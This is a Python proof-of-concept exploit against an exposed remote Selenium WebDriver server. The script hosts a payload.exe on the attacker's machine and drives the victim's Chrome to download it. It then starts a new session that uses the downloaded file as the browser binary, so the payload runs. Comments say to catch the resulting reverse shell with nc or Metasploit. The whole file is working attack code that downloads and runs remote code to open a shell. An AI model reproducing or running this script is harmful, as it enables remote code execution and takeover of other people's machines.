import socketserver
import threading
import time
import argparse
import posixpath
import urllib
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.options import Options
from http.server import HTTPServer, BaseHTTPRequestHandler


# python3 poc.py -h 10.10.10.10 -p 4444 -e "\tmp\test.exe" -w 192.168.1.1
# start nc -l port or use metasploit payload


# parsers
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,
   help="IP Selenium is running on")
parser.add_argument("-p", "--port", required=True,
   help="Port selenium is running on")
parser.add_argument("-e", "--exploit", required=True,
   help="Path to exploit")
parser.add_argument("-w", "--web", required=True,
   help="IP of machine hosting exploit (Should be attackers machine)")
args = parser.parse_args()


# attacker info
attack_url = args.web
attack_rev = args.exploit
attack_full = f"http://{attack_url}:8000/payload.exe"
attack_dl = f"http://{attack_url}:8000/download"

# victim info
vic_url = args.url
vic_port = args.port
vic_full = f"http://{vic_url}:{vic_port}/wd/hub"

# download path (Where chrome downloads the binary. needs to be writeable)
download_dir = "c:\\Users\\Public\\Documents" # \tmp linux
full_exploit = f"{download_dir}\\payload.exe"
download = f"<a href='{attack_full}' id='raw-url'>Download</a>"

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _set_headers_b(self):
        self.send_response(200)
        self.send_header("Content-type", "binary/octet-stream")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        
        if self.path == '/download':
            self._set_headers()
            self.wfile.write(self._html(download))
        if self.path == '/payload.exe':
            self._set_headers_b()
            with open(args.exploit, 'rb') as file: 
                self.wfile.write(file.read()) # Read the file and send the contents 

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        self.wfile.write(self._html("POST!"))

def run(server_class=HTTPServer, handler_class=S, addr="0.0.0.0", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

def run_web_background():
    run()

def thread_it():
    # do some stuff
    download_thread = threading.Thread(target=run_web_background)
    download_thread.start()

def selenium_dl_payload():
    # Phase 1 download reverse shell
    chrome_options = webdriver.ChromeOptions()
    preferences = {"download.default_directory": download_dir ,
               	"directory_upgrade": True,
               	"safebrowsing.enabled": True }
    chrome_options.add_experimental_option("prefs", preferences)
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=chrome_options.to_capabilities())
    # Selenium flow
    driver.get(attack_dl);
    dl = driver.find_element_by_id("raw-url")
    dl.click()

def exploit():
    # Phase 2 execute reverse shell
    print('Waiting for file to download')
    time.sleep(10)
    print('Check for shell.')
    option = Options()
    option.binary_location = full_exploit
    driver2 = webdriver.Remote(command_executor=vic_full, desired_capabilities=option.to_capabilities())
    driver2.get('http://google.com/')

def main():
    thread_it()
    selenium_dl_payload()
    exploit()


if __name__ == '__main__':
    main()